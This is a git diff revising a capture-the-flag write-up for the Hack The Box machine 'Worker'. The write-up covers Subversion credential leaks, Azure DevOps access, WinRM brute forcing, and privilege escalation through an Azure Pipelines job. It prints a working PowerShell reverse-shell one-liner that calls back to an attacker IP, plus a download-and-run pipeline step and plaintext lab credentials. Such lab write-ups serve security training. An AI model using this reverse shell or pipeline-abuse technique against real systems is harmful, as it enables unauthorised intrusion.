@@ -93,11 +93,15 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 113.30 seconds
 ```
 
-3 ports - 80 - HTTP, 3690 - Subversion, and 5985 - Presumably WinRM
+3 ports open: 80 - HTTP, 3690 - Subversion, and 5985 - Presumably WinRM
+
+### Port 80 - HTTP
 
 ![](../../.gitbook/assets/1-default-iis.png)
 
 nothing but default IIS on port 80, dirbuster revealed nothing of use
+
+### Port 3690 - Subversion
 
 [http://svnbook.red-bean.com/](http://svnbook.red-bean.com/)
 
@@ -352,9 +356,11 @@ I checked the changes that had been made in each revision, and found that at one
 
 This credential set did not work for logging into the devops page, nor for WinRM. After getting no progress for awhile, I reset the box and the login worked for the devops page, still not for WinRM
 
-[https://azure.microsoft.com/en-us/resources/videos/smarthotel360-demo-app-overview/](https://azure.microsoft.com/en-us/resources/videos/smarthotel360-demo-app-overview/)
+### The Azure DevOps Portal
 
 ![](../../.gitbook/assets/7-ekenas.png)
+
+[https://azure.microsoft.com/en-us/resources/videos/smarthotel360-demo-app-overview/](https://azure.microsoft.com/en-us/resources/videos/smarthotel360-demo-app-overview/)
 
 After logging in, I found myself in a Azure DevOps portal as the user named `ekenas`.
 
@@ -386,7 +392,7 @@ Under SmartHotel360 there was a mostly empty project called `w45ty45t`.
 
 In all, found 3 usernames, and a possible password `w45ty45t`
 
-## The Azure DevOps Repository
+### Crafting an .aspx reverse shell
 
 None of the usernames or potential passwords got me anywhere, so I began to look closer at what I was able to do in the `SmartHotel360` repository.
 
@@ -455,7 +461,7 @@ got connection to my waiting webserver which hosted a reverse shell ps1 script
 $client = New-Object System.Net.Sockets.TCPClient("10.10.15.98",8099);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
 
-My powershell script consisted of a reverse shell one-liner found on [https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3\#gistcomment-3391254](https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3#gistcomment-3391254)
+My PowerShell script consisted of a reverse shell one-liner found on [https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3\#gistcomment-3391254](https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3#gistcomment-3391254)
 
 ## Initial Foothold
 
@@ -869,6 +875,8 @@ W:\SVNREPOS
             db.lock
 ```
 
+That `passwd` file in `W:\svnrepos\www\conf\` looked interesting
+
 ### Finding user creds
 
 ```text
@@ -923,17 +931,17 @@ sarkil = friday
 
 In the folder `W:\svnrepos\www\conf` there was a file `passwd` that contained a list of usernames and passwords. This looked like a good time to brute force WinRM
 
+### Port 5985 - WinRM
+
 [https://github.com/mchoji/winrm-brute](https://github.com/mchoji/winrm-brute)
 
-used winrm-brute to
-
-### User.txt
+used `winrm-brute` to cycle through the list of usernames and passwords
 
 ```text
 [SUCCESS] user: robisl password: wolves11
 ```
 
-Retrieved the password for one of the users
+Retrieved the password for one of the users `robisl`
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/worker/winrm-brute]
@@ -979,7 +987,9 @@ SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
 ```
 
-Using evil-winrm I was able to login with the password specified for `robisl`
+Using `evil-winrm` I was able to login with the password specified for `robisl`
+
+### User.txt
 
 ```text
 *Evil-WinRM* PS C:\Users\robisl\Documents> cd ../Desktop
@@ -1004,19 +1014,58 @@ On the user's desktop I found the `user.txt` flag
 
 ### Enumeration as `robisl`
 
-After searching high and low, and enumerating as much as I could, I didn't find anything useful.
+After searching high and low and enumerating as much as I could, I didn't find anything useful.
+
+![](../../.gitbook/assets/13-sign-inas%20%281%29.png)
+
+I tried to switch users to `robisl` in the `devops` portal.
 
 ![](../../.gitbook/assets/13-sign-inas-fail%20%281%29.png)
 
-I tried switching users in the `devops` page I had open, and received an error message. I decided to try `robisl`'s credentials on a fresh `deveops` page after closing it, and was logged in to a different project
+I tried switching users in the `devops` page I had open, but received an error message saying that this user did not have the permissions needed to view project-level information.
 
-[https://azure.microsoft.com/en-us/services/devops/](https://azure.microsoft.com/en-us/services/devops/)
+![](../../.gitbook/assets/14-partsunlimited%20%281%29.png)
 
-[https://docs.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops](https://docs.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops)
+ I decided to try `robisl`'s credentials on a fresh `devops` page after closing it and clearing my cache, and was happy to see that I was logged in to a different project.
+
+* [https://azure.microsoft.com/en-us/services/devops/](https://azure.microsoft.com/en-us/services/devops/)
+* [https://docs.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops](https://docs.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops)
 
 > Azure Pipelines provides a quick, easy, and safe way to automate building your projects and making them available to users.
 
-This sounds like an easy way to get code execution...I wonder if there is a way to run it in the context of `Administrator`?
+![](../../.gitbook/assets/14-pipeline%20%281%29.png)
+
+This sounds like a good way to try to get code execution...I wonder if there is a way to run it in the context of `Administrator`?  I put some code in the `azure-pipelines.yml` that I hoped would execute and download my reverse shell script.
+
+![](../../.gitbook/assets/14-build-failed%20%281%29.png)
+
+Unfortunately this did not work.  After doing even more reading, I found that I had to assign an agent from the pool to build the project.
+
+![](../../.gitbook/assets/14-agent-pool-setup%20%281%29.png)
+
+Agetnt pool selection
+
+![](../../.gitbook/assets/14-agent-pool-setup2%20%281%29.png)
+
+Assign the job to the agent
+
+
+
+![](../../.gitbook/assets/14-run%20%281%29.png)
+
+Save and run
+
+![](../../.gitbook/assets/15-building%20%281%29.png)
+
+The build job was started
+
+![](../../.gitbook/assets/15-success%20%281%29.png)
+
+The job built successfully, but my script failed to run. I checked my syntax on everything and made sure I did all of the proper steps and tried again.
+
+![](../../.gitbook/assets/15-success2%20%281%29.png)
+
+Unfortunately I don't remember exactly what I had done wrong, or how I fixed it \(I need to take more detailed notes, I guess!\).  However, after a lot of trial and error, I was able to get the project to build and also execute my script.  No I hoped that it would actually execute the PowerShell script and send me a reverse shell!
 
 New Pipeline - Azure Repos Git - PartsUnlimited - Starter Pipeline
 
@@ -1026,6 +1075,8 @@ New Pipeline - Azure Repos Git - PartsUnlimited - Starter Pipeline
 Serving HTTP on 0.0.0.0 port 8909 (http://0.0.0.0:8909/) ...
 10.10.10.203 - - [12/Dec/2020 20:32:32] "GET /revShell.ps1 HTTP/1.1" 200 -
 ```
+
+My waiting python HTTP server got a connection request, and I could see that it sent the script.
 
 ### Getting a shell
 
@@ -1107,6 +1158,8 @@ SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for anot
 PS W:\agents\agent11\_work\8\s>
 ```
 
+I was happy to see that my script worked, and I got a reverse shell as `NT Authority/System`!
+
 ### Root.txt
 
 ```text
@@ -1121,9 +1174,11 @@ PS C:\users\Administrator\Desktop> type root.txt
 8af884b2e94242799a6b6dbb19eb9add
 ```
 
-Had to recreate my session as some automated process deleted it after a short time, but was able to retrieve my proof!
+I unfortunately had to recreate my session as some automated process deleted it after a short time, but after so much effort I was able to retrieve my proof!
 
-Thanks to [`<box_creator>`](https://www.hackthebox.eu/home/users/profile/<profile_num>) for something interesting or useful about this machine.
+![](../../.gitbook/assets/0-worker-pwned.png)
+
+Thanks to [`ekenas`](https://app.hackthebox.eu/users/222808) for... \[something interesting or useful about this machine.\]
 
 If you like this content and would like to see more, please consider supporting me through Patreon at [https://www.patreon.com/zweilosec](https://www.patreon.com/zweilosec).
 
